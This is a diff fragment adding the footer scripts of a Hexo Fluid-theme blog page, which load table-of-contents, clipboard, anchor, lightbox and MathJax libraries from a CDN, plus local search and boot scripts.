+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
